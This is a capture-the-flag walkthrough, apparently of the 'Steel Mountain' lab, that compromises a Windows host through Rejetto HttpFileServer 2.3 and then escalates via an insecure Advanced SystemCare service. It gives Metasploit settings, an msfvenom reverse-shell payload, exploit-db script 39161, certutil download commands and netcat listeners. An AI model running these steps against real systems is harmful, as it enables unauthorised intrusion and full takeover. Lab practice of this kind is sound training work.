Let's begin by exporting the IP as 'target' in the environment variables: `export target=IP`
![[Pasted image 20251115072758.png]]

Create a 'SteelMountain' directory and scan the network with rustscan followed by a more precise scan with nmap: `rustscan -a $target --ulimit 5000 -- -sC -sV -oA scan`
![[Pasted image 20251115073314.png]]

![[Pasted image 20251115073649.png]]

![[Pasted image 20251115083335.png]]

As you can see there are many ports open. Let's begin by visiting the website:
![[Pasted image 20251115084322.png]]
By right clicking the image and inspecting it, we can find the name of the employee of the month and answer the first question.

It seems there are no other links or interesting things in this page. Let's try port 8080:
![[Pasted image 20251115084903.png]]
In the lower-left corner of the screen you can see the name and version of the file server. Doing a quick research on google we can see it is a Rejetto HttpFileServer 2.3.

First, we will exploit this using Metasploit. Let's fire it up and search for rejetto exploits:
![[Pasted image 20251115090415.png]]
We will use the 2014 one: `use 1`.

Now let's configure the options `show options` and let's make some changes:
`set RHOSTS <target IP>`
`set RPORT 8080`
`set LHOST <local IP>`
We can leave the LPORT to 4444
And finally hit `run` or `exploit`!
![[Screenshot 2025-11-15 093743.png]]
And...We're in! `getuid` `STEELMOUNTAIN\bill`

Now we will use the `upload` functionality of meterpreter to upload `PowerUp.ps1` in the `%TEMP%` folder:
![[Pasted image 20251115105212.png]]

It's time to `load powershell` and open `powershell_shell` to fire up `PowerUp.ps1` and `Invoke-AllChecks` to do some enumeration:
![[Pasted image 20251115105658.png]]

The first entry is what we need.
An Advanced SystemCare9 service that we `CanRestart : True` with `AppendData` permissions, running as `LocalSystem` to escalate our privileges.
`PowerUp.ps1` is flagging us an unquoted service path vulnerability as well, but now we will focus on the insecure service permissions one.

What we need now is to exit from the powershell istance `CTRL+C` and enter cmd `shell` to `sc stop AdvancedSystemCareService9` to upload the msfvenom shell we will create now in another terminal in our kali attacker, named as the executable `ASCService.exe`:
`msfvenom -p windows/shell_reverse_tcp LHOST=xx.xx.xx.xx LPORT=4445 -e x86/shikata_ga_nai -f exe -o ASCService.exe`
![[Pasted image 20251115111742.png]]

![[Pasted image 20251115111953.png]]

We will now move to the folder of the service's executable `C:\Program Files (x86)\IObit\Advanced Systemcare\` and go back to meterpreter to upload our shell. 
The upload function of meterpreter will automatically overwrite the file.
![[Pasted image 20251115113801.png]]

Now it's time to fire up netcat `nc -lvnp 4445` and start the service:
![[Pasted image 20251115114224.png]]

The service will probably crash but we will have triggered our payload. We are now root.
![[Pasted image 20251115115712.png]]


Now we will redo all the phases of this bow without automatic exploitation.

We will begin by searching for an exploit in the exploitdb:
`searchploit rejetto`
![[Pasted image 20251116102959.png]]

We will use the 39161.py one. Let's download it:
![[Pasted image 20251116103056.png]]

In the exploit we only need to change the IP and the LPORT to make it work.

In another terminal we will open a server hosting a `netcat.exe` file named as `nc.exe`
and open an `nc` listener on another one.
We need to run this exploit twice, one to upload the `nc.exe` file and one to establish the connection.
First run:
![[Pasted image 20251116103425.png]]

![[Pasted image 20251116103549.png]]

Now that we're in, we will upload `winpeas` to do some enumeration:
We will again open a server hosting the file and use `certutil` to download it:
![[Pasted image 20251116104818.png]]

Now it's time to fire it up:
`.\winPEAS.exe servicesinfo`
![[Pasted image 20251116110013.png]]

And as predicted, winpeas found our ASC privesc vuln.

Now we will use certutil again to download and substitute the original ASCService.exe with our payload, after we have stopped the service:
![[Pasted image 20251116110138.png]]

![[Pasted image 20251116110849.png]]

In another terminal, fire up `nc -lvnp <PORT>` and finally, by restarting the service we will own our root shell. 
`sc start AdvancedSystemCareService9`
![[Pasted image 20251116111133.png]]

![[Pasted image 20251116111214.png]]
